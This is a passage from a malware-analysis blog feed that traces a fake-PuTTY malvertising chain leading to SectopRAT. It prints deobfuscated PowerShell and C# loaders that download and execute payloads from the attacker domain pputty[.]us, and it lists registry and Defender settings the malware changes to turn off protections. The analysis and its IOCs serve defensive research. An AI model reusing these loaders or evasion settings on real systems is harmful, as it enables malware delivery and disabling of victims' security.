<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PowerShell" data-lang="PowerShell">$firstString = <span style="color:#e6db74">&#39;AAAAAAAAAAAAAAAAAAAAAPhV/VZ6nliBpw0blRhYHFy8uOMZrCs004iC/zUNLNU+HMua76DNadYaA9soXAQC7haP7Id8A08qD8pvMK/V6arPhdbP/a2Osqu10DKceGWI3qaw+nzPAfDUJ35pavHM3PetLyPWhvypz7eQIzvfkNJGl0USK1lh2+iZeWjYT08jd3N33rvhoRnZ6NCOr86BBTw/rYh+aeQl7pfvacq1xAvHvZoOXBBL1pSQxdM22OMCO57JV5dAy0/6IGnA0rM0J6hOBA5g/qKydwjKo5C+1NN0iF/ewdiZbOf9SFvRWhIoP6zNK/W6KioKxR604X7MQJz8HpgQvAOgRdTiYcPs7iWxXu6lJsQvFQ1peat8b8tO3C/kUT6eenSeeVwJyeLHb3U+GGcGZODSjIXdo3IiS7y4hbw0CPqFUd96jxArpvuySF2lO/hwYyWOZZrxS5cij0U1ECgL7kdSpKLAVHo1nwyq8AOEQcQuvRL7+w32vIFHmO27HAY5P3ELFhI0Yr99+oez3yD73f2U3/zJBvd8ropF7PafpRv9DIhLQnL3v6tAVzSGMMLdiofZYn3mAZ0ffebrP8R+Nuiq6LZD2P22RB/gl2Oact+1XIEcPNTaNHWxdGClp8QPPr++SdYN/0+u8t91Q2C3JNj3F9yYLESJ8xUyBsK+ot3voYmk9HPHkD6rxkuKFjeMTAe5OxJeEsJw9VcuA7qZEBXsdCnnoUPI1PN7kabdxmNLmh5fYVqxUg7dihQPLmkiNH6kMWj8bpM3gJhk0OCWNg2z9S2UcI4uOHrOlJnF2ubUXNpPSAd+8jXZLzx3o7na1ijV976he5Q/vfpFFUXtJjm4bMr/0vA2RyFM98wVlw5QJ1SIS6yxGvGkvqVt+r3RmACMkkVsUNkM/cFBcYW+SAMPQcrIVH7Pr31+hrwpT9vaI1+rIuNK4Gxn9WSTxTW0r/kDj086H9bJhA==&#39;</span>;
$secondB64 = <span style="color:#e6db74">&#39;d0dJZmhTRnRma1JIeVhwWFRscmtseXZ5UndqU1hiaXE=&#39;</span>;

$aesObject = New-Object <span style="color:#e6db74">&#39;System.Security.Cryptography.AesManaged&#39;</span>;
$aesObject.Mode = <span style="color:#66d9ef">[System.Security.Cryptography.CipherMode]</span>::ECB;
$aesObject.Padding = <span style="color:#66d9ef">[System.Security.Cryptography.PaddingMode]</span>::Zeros;
$aesObject.BlockSize = 128;
$aesObject.KeySize = 256;
$aesObject.Key = <span style="color:#66d9ef">[System.Convert]</span>::FromBase64String($secondB64);

$firstStringDecoded = <span style="color:#66d9ef">[System.Convert]</span>::FromBase64String($firstString);

$theIV = $firstStringDecoded[0..15];
$aesObject.IV = $theIV;
$decryptor = $aesObject.CreateDecryptor();
$decrypted = $decryptor.TransformFinalBlock($firstStringDecoded, 16, $firstStringDecoded.Length - 16);

$aesObject.Dispose();

$memoryStream = New-Object System.IO.MemoryStream( , $decrypted );
$secondMemoryStream = New-Object System.IO.MemoryStream;
$decompressedVar = New-Object System.IO.Compression.GzipStream $memoryStream, (<span style="color:#66d9ef">[IO.Compression.CompressionMode]</span>::Decompress);

$decompressedVar.CopyTo( $secondMemoryStream );
$decompressedVar.Close();
$memoryStream.Close();

<span style="color:#66d9ef">[byte[]]</span> $byeArray = $secondMemoryStream.ToArray();
$finalString = <span style="color:#66d9ef">[System.Text.Encoding]</span>::UTF8.GetString($byeArray);
$finalString | powershell - 
</code></pre></div><p>The first base64 is a gzip compressed, AES encrypted string and is decrypted using the second base64 string as the key. Once the decryption is complete, the data is decompressed and passed to a byte array, and then converted to a string, which is finally executed by PowerShell.</p>
<p>Now I&rsquo;ve got a second iteration of PowerShell to investigate. As it is nothing special, I will skip showing the screenshot with the obfuscation and jump straight to the cleaned version.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PowerShell" data-lang="PowerShell"><span style="color:#66d9ef">function</span> write_all_bytes($plE, $oqF){
	<span style="color:#66d9ef">[IO.File]</span>::WriteAllBytes($plE, $oqF)
};

<span style="color:#66d9ef">function</span> execute_file($arg1){
	<span style="color:#66d9ef">if</span>($arg1.EndsWith(<span style="color:#e6db74">&#39;.dll&#39;</span>) <span style="color:#f92672">-eq</span> $True){
		rundll32.exe $arg1 
	}
	<span style="color:#66d9ef">elseif</span>($arg1.EndsWith(<span style="color:#e6db74">&#39;.ps1&#39;</span>) <span style="color:#f92672">-eq</span> $True){
		powershell.exe -ExecutionPolicy unrestricted <span style="color:#f92672">-File</span> $arg1
	}
	<span style="color:#66d9ef">elseif</span>($arg1.EndsWith(<span style="color:#e6db74">&#39;.msi&#39;</span>) <span style="color:#f92672">-eq</span> $True){
		misexec /qn /i $arg1
	}
	<span style="color:#66d9ef">elseif</span>($arg1.EndsWith(<span style="color:#e6db74">&#39;.jar&#39;</span>) <span style="color:#f92672">-eq</span> $True){
		powershell.exe -ExecutionPolicy unrestricted java -jar $arg1
	}
	<span style="color:#66d9ef">else</span>{
		Start-Process $arg1
	}
};

<span style="color:#66d9ef">function</span> download_data($arg1){
	$web_client = New-Object (<span style="color:#e6db74">&#39;Net.WebClient&#39;</span>);
	<span style="color:#66d9ef">[Net.ServicePointManager]</span>::SecurityProtocol = <span style="color:#66d9ef">[Net.SecurityProtocolType]</span>::TLS12;
	$return_data = $web_client.DownloadData($arg1);
	<span style="color:#66d9ef">return</span> $return_data
};

<span style="color:#66d9ef">function</span> convert_to_str($arg1){
	$num_var=7621;
	$return_val=$Null;
	<span style="color:#66d9ef">foreach</span>($iterator <span style="color:#66d9ef">in</span> $arg1){
		$return_val += <span style="color:#66d9ef">[char]</span>($iterator-$num_var)
	};
	<span style="color:#66d9ef">return</span> $return_val
};

<span style="color:#66d9ef">function</span> main(){
	$app_data_path = $env:AppData + <span style="color:#e6db74">&#39;\&#39;</span>;
	$appdata_path2= $env:AppData;
	$7zlogo_path = $appdata_path2 + <span style="color:#e6db74">&#39;\7ziplogo.png&#39;</span>;
	<span style="color:#66d9ef">If</span>(Test-Path -Path $7zlogo_path){
		Invoke-Item $7zlogo_path;
	}
	<span style="color:#66d9ef">Else</span>{ 
		$7zdownload_result = download_data (<span style="color:#e6db74">&#39;https://www.7-zip[.]de/7ziplogo.png&#39;</span>);
		write_all_bytes $7zlogo_path $7zdownload_result;
		Invoke-Item $7zlogo_path;
	};;;
	
	$setup_path = $app_data_path + <span style="color:#e6db74">&#39;setup.exe&#39;</span>;
	<span style="color:#66d9ef">if</span> (Test-Path -Path $setup_path){
		execute_file $setup_path;
	}
	<span style="color:#66d9ef">Else</span>{ 
		$pputty_download = download_data (<span style="color:#e6db74">&#39;https://pputty[.]us/setup.exe&#39;</span>);
		write_all_bytes $setup_path $pputty_download;
		execute_file $setup_path;
	};;
}

main;
</code></pre></div><p>The second stage PowerShell will download and perform two main actions. The first, is to download an image from <code>www.7-zip.de</code>, which unless I am mistaken is a legitimate version of the 7zip site. I am not sure why this is done, as <code>Invoke-Item</code> in PowerShell will just open the file in an image viewer. Maybe this is testing for further malicious use or part of an attempt to fool the victim into thinking they&rsquo;ve downloaded legitimate software.</p>
<p>Regardless, the next main action is to download (if not already present), a file named <code>setup.exe</code> from the familiar <code>pputty[.]us</code>, and execute it depending on its extension.</p>
<p>Sadly, not much more to see here, as this EXE looks to be identical to the loader I examined in the previous post, down to the conspicuous <code>Cnfggs</code> class.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/loader_dnspy.jpg"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/loader_dnspy.jpg"
            alt="loader_dnspy"
            />
    </a>
    
</figure>
<p>I tried to grab the files hosted on <code>cloudinstalller73489[.]shop</code>, but was hit with a &ldquo;1010&rdquo; error.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/error_code_1010.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/error_code_1010.png"
            alt="error_code_1010"
            />
    </a>
    
</figure>
<p>According to the CloudFlare docs, this error occurs when &ldquo;the owner of this website has banned your access based on your browser&rsquo;s signature&rdquo;. Guess the threat actor is tightening things up.</p>
<h3 id="wrap-up">Wrap Up</h3>
<p>This was certainly an interesting path. Starting with a <code>.url</code> file, I went from an <code>.lnk</code>, to a WMIC call to PowerShell, to an <code>.hta</code> file with VBScript, back to PowerShell, and finally to the familiar loader which I&rsquo;ve already determined leads to the SectopRAT.</p>
<p>Read my previous post, <a href="https://rerednawyerg.github.io/malware-analysis/gad_sectoprat/">Google Ad Leads to SectopRAT</a> for more.</p>
<h3 id="iocs">IOCs</h3>
<ul>
<li><code>cloudinstalller73489[.]shop</code></li>
<li><code>pputty[.]us</code></li>
<li><code>179.43.142[.]86</code></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Google Ad Leads To SectopRAT</title>
            <link>https://rerednawyerg.github.io/posts/malwareanalysis/gad_sectoprat/</link>
            <pubDate>Mon, 13 Feb 2023 06:53:30 -0600</pubDate>
            
            <guid>https://rerednawyerg.github.io/posts/malwareanalysis/gad_sectoprat/</guid>
            <description>I wanted my first foray into reverse engineering to cover a malware sample from beginning to end - from initial download to the final payload. As I am just getting started on the RE learning journey, I also wanted to find a sample which wasn&amp;rsquo;t too difficult.</description>
            <content type="html"><![CDATA[
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe.min.css" integrity="sha256-sCl5PUOGMLfFYctzDW3MtRib0ctyUvI9Qsmq2wXOeBY=" crossorigin="anonymous" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/default-skin/default-skin.min.css" integrity="sha256-BFeI1V+Vh1Rk37wswuOYn5lsTcaU96hGaI7OUVCLjPc=" crossorigin="anonymous" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe.min.js" integrity="sha256-UplRCs9v4KXVJvVY+p+RSo5Q4ilAUXh7kpjyIP5odyc=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe-ui-default.min.js" integrity="sha256-PWHOlUzc96pMc8ThwRIXPn8yH4NOLu42RQ0b9SpnpFk=" crossorigin="anonymous"></script>


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
<script src="/js/pswp-init.js"></script>

<p>I wanted my first foray into reverse engineering to cover a malware sample from beginning to end - from initial download to the final payload. As I am just getting started on the RE learning journey, I also wanted to find a sample which wasn&rsquo;t too difficult. Lucky for me, it has been the season of malicious Google ads, and samples from a large variety of malware families have been easy to find.</p>
<p>In this post, I will outline my process for working through this sample, the difficulties encountered, and the useful resources I found along the way.</p>
<h3 id="malicious-google-ad">Malicious Google Ad</h3>
<p>Threat actors abusing ad services and redirecting victims to fake software sites is not a new phenomenon, but the volume of this activity increased dramatically in December of 2022, and has continued through early 2023.<br>
I decided to start digging into some of these instances when I came across a neat <a href="https://github.com/rmceoin/gmalvertising">script</a> written by <a href="mailto:rmceoin@infosec.exchange">rmceoin@infosec.exchange</a> on Mastodon. The purpose of the script is to perform Google searches for various keywords and extract any suspicious ad URLs for further investigation.</p>
<p>Using the keyword &ldquo;PuTTY&rdquo;, the script identified a suspicious advertisement which lead to <code>pputty[.]us</code>, clearly not the legitimate PuTTY site.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/putty_ad.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/putty_ad.png"
            alt="putty_ad"
            />
    </a>
    
</figure></p>
<p>However, when clicking on this ad, all I saw was a benign looking blog page with a review about the PuTTY tool.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/fake_putty_blog_site.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/fake_putty_blog_site.png"
            alt="fake_blog_putty_site"
            />
    </a>
    
</figure>
<p>While investigating a number of malicious ads prior to this sample, I had noticed the initial sites would often perform a check on the victim&rsquo;s user agent, referer, and IP address. If the IP is in a known VPS or VPN range, the user agent doesn&rsquo;t indicate a Windows device, or the referer is not &ldquo;www.google[.]com&rdquo;, the victim will be shown a dummy page. Some of these dummy pages are more convincing, like this PuTTY blog &ndash; others are just the cloned homepages of completely unrelated sites.</p>
<p>Using BurpSuite&rsquo;s Repeater feature and jumping onto a mobile hotspot, I tweaked the request to the <code>pputty[.]us</code> domain to fit the desired parameters. Ah ha, this time time the site responded with a large base64 encoded section of JavaScript.</p>
<p>Note: for the more observant, I lost the screenshot of the response from <code>pputty[.]us</code>, so used a screenshot from a similar site, <code>pputty[.]shop</code> &ndash; the JS returned is the same.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/obf_javascript_response.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/obf_javascript_response.png"
            alt="obf_javascript_response"
            />
    </a>
    
</figure></p>
<p>The JS uses the <a href="https://developer.mozilla.org/en-US/docs/Web/API/WebGL_API">WebGL API</a> to fingerprint the device by capturing properties of the host GPU, allowing for finer grained OS detection.<br>
Once the site determines the victim is on a Windows device, we finally see a fake PuTTY download page.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/fake_putty_site.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/fake_putty_site.png"
            alt="fake_putty_site"
            />
    </a>
    
</figure>
<p>Upon clicking any of the links, a file called &ldquo;Setup.rar&rdquo; is downloaded from <code>cloudinstalller73489[.]shop</code>.</p>
<pre><code class="language-URL" data-lang="URL">hxxps://cloudinstalller73489[.]shop/d/MiA6712/dbOoTna/RVp4jKR/
</code></pre><p>Now to the fun part, let&rsquo;s dig in!</p>
<h3 id="loader-analysis">Loader Analysis</h3>
<p>The archive contains a PE file, &ldquo;Setup.exe&rdquo;, which is roughly 300MB in size. It turns out there are a <strong>lot</strong> of null bytes appended to the file, and after trimming these bytes, it is a more manageable 250KB.
I&rsquo;ve uploaded the trimmed binary to <a href="https://malshare.com/sample.php?action=detail&amp;hash=420dfb75c981fe4ab474de914e92c8171f52544d1f3a4d66bf9249e8578d729d">Malshare</a>.</p>
<p>The PE is written in .NET, so I cracked it open in DnSpy. The first thing I noticed is the assembly title <code>dotNotePad</code> and author <code>AlperAkca79</code>.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/dotnet_assembly_author.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/dotnet_assembly_author.png"
            alt="assembly_author"
            />
    </a>
    
</figure></p>
<p>A web search on the assembly author leads to this <a href="https://github.com/AlperAkca79/dotNotepad">GitHub repo</a>, which appears to be a legitimate implementation of a notepad application written in .NET. This developer isn&rsquo;t buying up Google ads to push their product &ndash; there is more to the story here.</p>
<p>After digging around for a bit, I determined the threat actor had modified the application, turning it into a loader for additional malware.</p>
<p>To get an understanding of the .NET code, I debugged it one step at a time using DnSpy. After calling methods to initialize properties needed by the legitimate software, the first thing the &ldquo;injected&rdquo; code does is execute a WMI query to determine the number of AV products on the device.</p>
<p>If the result is one, it reaches out to a hardcoded URL to download a DLL. If the download is successful, a specific method in the DLL is invoked. More on that next.</p>
<p>The loader will then call another method which reaches out to a different hardcoded URL, pulls down a long base64 string, decodes it, and writes it to a file with a <code>.exe</code> extension.</p>
<p>Interestingly, the URLs the loader uses to pull down additional malware are not obfuscated or even hidden at all; they are in plain text in an added class called <code>Cnfggs</code>, and are even hosted on the same domain as the initial payload.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/unobfuscated_class.jpg"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/unobfuscated_class.jpg"
            alt="unobfuscated_class"
            />
    </a>
    
</figure>
<p>Not much else to see in this loader. Different methods exist with other ways to download files, but were not implemented. For example, the value in the string currently holding <code>****_you_mom</code> would be checked for a specifically formatted string with a domain name, but the threat actor didn&rsquo;t elect to utilize this feature.</p>
<p>I grabbed the DLL and EXE files and added them to Malshare. Links below.</p>
<ul>
<li><a href="https://malshare.com/sample.php?action=detail&amp;hash=c1fadb8e09ba1257f7656be5a1c8d44e2a0da8697e8e0a32485714949a6c29ca">DLL</a></li>
<li><a href="https://malshare.com/sample.php?action=detail&amp;hash=7c1d70a4d194599074337b1d144be69b875a5960e5e86bdb1eeddb1f9369bd0b">EXE</a></li>
</ul>
<h3 id="loader-dll">Loader DLL</h3>
<p>On to the DLL. Once the loader downloads the file, it invokes a specific method using the following line:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C#" data-lang="C#">Assembly.Load(<span style="color:#66d9ef">new</span> WebClient().DownloadData(Cnfggs.modUrl)).GetTypes().FirstOrDefault((Type x) =&gt; x.Name == <span style="color:#e6db74">&#34;Init&#34;</span>).GetMethod(<span style="color:#e6db74">&#34;Load&#34;</span>).Invoke(<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>);
</code></pre></div><p>The DLL is also written in .NET, so I&rsquo;m able to analyze it in DnSpy. The .NET assembly is mildly obfuscated, using single letters in place of class/method/variable names.
Starting with the invocation of <code>Init.Load()</code>, I can see it calls <code>a.a()</code>, which in turn calls several other method from various classes.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/a_method_dll.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/a_method_dll.png"
            alt="a_method"
            />
    </a>
    
</figure>
<p>The first method called is <code>d.a()</code> and it looks intimidating, but is actually rather simple.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/d_a_method.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/d_a_method.png"
            alt="d_a_method"
            />
    </a>
    
</figure>
<p>All the method does is create integer variables, perform calculations on those variables, and pass them to a method, <code>&lt;Module&gt;.c()</code>.  Note: <code>&lt;Module&gt;</code> and <code>global</code> can be used interchangeably.</p>
<p>More detail on <code>&lt;Module&gt;.c()</code> &ndash; using the first two integer arguments, it grabs a set of bytes from offsets of the manifest resource named &ldquo;resource&rdquo;. In .NET, a manifest resource is a file embedded in the assembly at compile time. Next, the method performs an XOR using the third argument, and returns the result as a string. These strings are then used as argument to <code>d.b()</code>, which XORs the strings with each other and returns a deobfuscated, plaintext string.</p>
<p>The <code>d.a()</code> function simply repeats this process over and over.</p>
<p>For example, on line 26 <code>&lt;Module&gt;.c()</code> is called twice, returning <code>0:[3(2&amp;S&quot;&quot;/$?*]Gy{}b$&gt;&quot;&quot;'MA4373\PF</code> and <code>GS5WGEU7GIAQN85CTR6LLGF92QGCZ275</code>, respectively.</p>
<p>These strings are passed to <code>d.b()</code> and the variable <code>b</code> of the current class (<code>d</code>) is set to the result, <code>windowsdefender://Threatsettings</code>.</p>
<p>This pattern continues until the end of the method, where no value is returned. So, <code>d.a()</code> is used to decode the strings used by the rest of the methods &ndash; if I can set a breakpoint on the function return I can see them all in cleartext.</p>
<p>Since I am dealing with a DLL, I can&rsquo;t just debug it on its own in DnSpy. In order to help me debug it, I created an x86 release binary with Visual Studio which will load the malicious DLL and call the <code>Init.Load()</code> method. I added the wrapper executable into DnSpy and set a breakpoint on the DLL method call. If I debug the executable and step into the DLL call, DnSpy will load it, and allow me to step through line by line.</p>
<p>After entering the DLL, I set another breakpoint right after the <code>d.a()</code> method returns, hit &ldquo;continue&rdquo;, and boom, we can see all the strings created by the method in cleartext.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/dll_string_dump.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/dll_string_dump.png"
            alt="dll_string_dump"
            />
    </a>
    
</figure>
<p>These strings are used in the remaining methods, which I will summarize for brevity.</p>
<ul>
<li><code>h.c(</code>): Sets the registry key <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\ConsentPromptBehaviorAdmin</code> to 0. A value of 0 allows administrators to perform operations that require elevation without consent (meaning prompts) or credentials.</li>
<li><code>h.d()</code>: Add <code>C:\</code> to the Defender exclusion path.</li>
<li><code>b.a(</code>): Purpose seems to be to open Windows Defender Virus &amp; Threat Protection settings window, programmatically grab UI elements using the AutomationElement class, iterate through the elements, toggle the options off on the security page, and then hide the window. After testing it through with the debugger, it does not seem successful.</li>
<li><code>h.a()</code>: Changing more security settings using either WMI or Win32 API calls. See below.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows DefenderDisableAntiSpyware : 1
HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run\SecurityHealth : 3
HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinDefend\Start : 3
HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\DisableRealtimeMonitoring : 1
EnableControlledFolderAccess : Disabled
PUAProtection : disable
DisableRealtimeMonitoring : true
DisableBlockAtFirstSeen : true
DisableIOAVProtection : true
DisablePrivacyMode : true
SignatureDisableUpdateOnStartupWithoutEngine : true
DisableArchiveScanning : true
DisableIntrusionPreventionSystem : true
DisableScriptScanning : true
DisableAntiSpyware : true
DisableAntiVirus : true
SubmitSamplesConsent : 2
MAPSReporting : 0
HighThreatDefaultAction : 6
ModerateThreatDefaultAction : 6
LowThreatDefaultAction : 6
SevereThreatDefaultAction : 6
ScanScheduleDay : 8
</code></pre></div><p>Alright, so I know the purpose of the DLL is to attempt to disable Windows Defender security features, with seemingly varying levels of success. The UI element iteration attempt was certainly interesting.</p>
<p>Now that I have unraveled the purpose of the DLL, my focus turns to the other file created by the loader.</p>
<h3 id="loader-exe">Loader EXE</h3>
<hr>
<hr>
<p><em>Edited 2/20/2023</em></p>
<p>During recent research on different samples, I came across another loader which exhibited similar behavior. After doing some digging, I realized these loaders were created using a <a href="https://ss64.com/nt/iexpress.html">native Microsoft utility</a> called <code>iexpress.exe</code>, which takes specified files and transforms them into self-extracting archives within an EXE file.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/iexpress_wizard.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/iexpress_wizard.png"
            alt="iexpress_wizard"
            />
    </a>
    
</figure>
<p>Running the utility with administrative privileges, I was able to walk through a wizard which configured all the steps I am going to outline below. All the configuration items are saved under the <code>RCData</code> resource type, where <code>CABINET</code> holds an archive of all the files selected, while <code>RUNPROGRAM</code> and <code>POSTRUNPROGRAM</code> hold the commands to run before and after the archive is decompressed.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/iexpress_output.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/iexpress_output.png"
            alt="iexpress_output"
            />
    </a>
    
</figure>
<p>Additional configuration items, like whether to reboot the device after the EXE runs, or whether to allow the user to confirm whether they want to install the software, are held in <code>REBOOT</code> and <code>UPROMPT</code>, respectively.</p>
<p><em>End Of Edited Section</em></p>
<hr>
<hr>
<p>This is where things got a little more tricky.  Without getting too ahead of myself, I determined this PE file was a dropper for another malware exe, so I will refer to it as &ldquo;the dropper&rdquo; going forward.</p>
<p>The dropper was not written in .NET, so I used Ghidra and x32dbg for the analysis. Starting at the entry point, I used the debugger to manually step through all the user generated code, and used Ghidra as a reference point to help keep my place and get a sense for what each function was doing.  This was quite time consuming, and I had to often stop and Google the various API functions.</p>
<p>The first important function I came across, I renamed to <code>readResource</code> &ndash; it uses the FindResourceA, LoadResourceA, and LockResourceA Win32 API functions to extract data from the PE resource files.</p>
<p>The dropper checks a few of the resources to ensure they hold the string &ldquo;&lt;NONE&gt;&rdquo;, then it checks a resource called <code>RUNPROGRAM</code>. If it does <em>not</em> contain &ldquo;&lt;NONE&gt;&rdquo;, then a directory is created in the following location:<br>
<code>C:\Users\&lt;user&gt;\AppData\Local\Temp\IXP000.TMP</code>. If the folder already exists, <code>IXP001.TMP</code> will be created, then <code>002</code>, and so on.</p>
<p>The dropper checks whether it can write to the folder, uses DecryptFileA to determine if the directory is encrypted (it is not), and then changes the process&rsquo;s current directory to the newly created folder.</p>
<p>The next set of functions, I am a little fuzzy on, but I think I understood the general purpose. First, a handle is created to a dialog box resource. Next, DialogBoxIndirectParamA is called, passing in the handle to the data in the dialog box, as well as a function which, among other things, loads the data from a resource called <code>CABINET</code>.</p>
<p>As a brief aside, taking a look at the <code>CABINET</code> resource in ResourceHacker, I could see the file header started with &ldquo;MSCF&rdquo;, the signature for Microsoft CAB archive files.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/cabinet_resource.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/cabinet_resource.png"
            alt="cabinet_resource"
            />
    </a>
    
</figure>
<p>I also noticed there were quite a few DIALOG resources. Interestingly, some were in English and some were in Russian.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/dialog_box_2004.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/dialog_box_2004.png"
            alt="dialog_box_2004"
            />
    </a>
    
</figure>
<p>The call to DialogBoxIndirectParamA ends up extracting the three files from the <code>CABINET</code> resource into the <code>IXP000.TMP</code> folder.</p>
<p>Using ResourceHacker, I saved the data within the <code>CABINET</code> resource to a file with a <code>.cab</code> extension, and extracted it to a temporary folder. It contained three files, <code>2</code>, <code>6</code>, and <code>86</code>.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/cab_extracted.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/cab_extracted.png"
            alt="cabinet_extracted"
            />
    </a>
    
</figure>
<p>After the three files are created, the registry key <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\wextract_cleanup0</code> is created, with the value <code>rundll32.exe C:\Windows\system32\advpack.dll,DelNodeRunDLL32 &quot;C:\Users\&lt;user&gt;\AppData\Local\Temp\IXP000.TMP\&quot;</code>, which will ensure the deletion of the <code>IXP000</code> folder on reboot.</p>
<p>After several more function calls, the data within the resource <code>POSTRUNPROGRAM</code> is read and executed. The resource data contains the string <code>cmd /c cmd &lt; 2</code>. If run in a command prompt this will execute a file named &ldquo;2&rdquo;, and hey, that is the name of a file from the CAB archive.</p>
<p>The dropper performs a few more wrap up actions, but these aren&rsquo;t necessary for this write up, so I will move on to examining the three files from the CAB archive.</p>
<h3 id="the-2-file">The &ldquo;2&rdquo; File</h3>
<p>Begining with the file named &ldquo;2&rdquo;, I began by determining the file type, ASCII text, so I opened it up in a text editor. At first glance, it appeared to be a batch script with some variable renaming in place to hamper readability.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/2_file_raw.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/2_file_raw.png"
            alt="2_file_raw"
            />
    </a>
    
</figure>
<p>After cleaning up the file, I was left with something much more understandable.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/2_file_cleaned.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/2_file_cleaned.png"
            alt="2_file_cleaned"
            />
    </a>
    
</figure>
<p>First, the script sets the &ldquo;fileName&rdquo; and &ldquo;extension&rdquo; variables, then checks to see if the Avast AV software is present on the system. If so, it sets fileName to <code>AutoIt3.exe</code> and extension to <code>.a3x</code>. If not, the original variables are kept.</p>
<p>Next, a directory is created with a random name generated by calling the <code>%random%</code> command. Then, the script decodes the <code>86</code> file using certutil, and names the result <code>86YEO</code>. Looking at the original <code>86</code> file, it appears to be a certificate file, but when b64 decoded, looks more like a PE file.</p>
